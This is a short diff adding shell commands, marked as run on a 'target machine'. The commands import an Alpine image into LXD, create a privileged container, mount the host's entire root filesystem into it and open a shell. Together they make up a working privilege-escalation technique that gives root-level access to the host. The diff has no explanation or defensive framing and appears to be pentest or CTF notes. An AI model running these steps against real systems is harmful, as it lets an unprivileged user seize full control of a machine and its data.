@@ -1,0 +1,9 @@
+[IN TARGET MACHINE]:
+
+lxc image import alpine.tar.gz --alias myimage
+lxc image list
+
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
